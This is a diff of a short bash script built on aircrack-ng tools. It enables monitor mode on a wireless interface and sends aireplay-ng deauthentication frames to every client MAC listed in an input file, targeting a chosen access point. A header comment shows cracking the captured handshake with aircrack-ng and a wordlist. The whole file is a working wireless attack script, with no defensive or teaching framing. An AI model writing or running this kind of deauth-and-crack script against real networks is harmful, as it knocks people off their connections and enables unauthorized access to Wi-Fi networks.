@@ -7,19 +7,18 @@
 # aircrack-ng <file.cap> -w <wordlist>
 
 # usage ./air.sh <input file>
+# input file list of MAC addresses
+IFC="wlanX" # mon interface
+AP="00:00:00:00:00:00" # target AP MAC
+CHANNEL="X" #AP CHannel
 
-MON=`cat /sys/class/net/wlanXmon/operstate`
+MON=`cat /sys/class/net/$IFC/operstate`
 if [ "$MON" != "unknown" ] ; then
-        echo "$MON"
         echo "enabling mon"
-        airmon-ng start wlanX
-#       airodump-ng -c 11 wlanXmon #set channel
+        airmon-ng start $IFC $CHANNEL
 fi
 
-echo "deauth"   
-aireplay-ng --deauth $(( $RANDOM % 5 + 1)) -a MAC -c MAC wlanXmon
-
 while IFS='' read -r line || [[ -n "$line" ]]; do
-        aireplay-ng --deauth $(( $RANDOM % 5 + 1)) -a MAC -c $line
+        aireplay-ng --deauth $(( $RANDOM % 5 + 1)) -a $AP -c $line $IFC
 done < "$1"
 
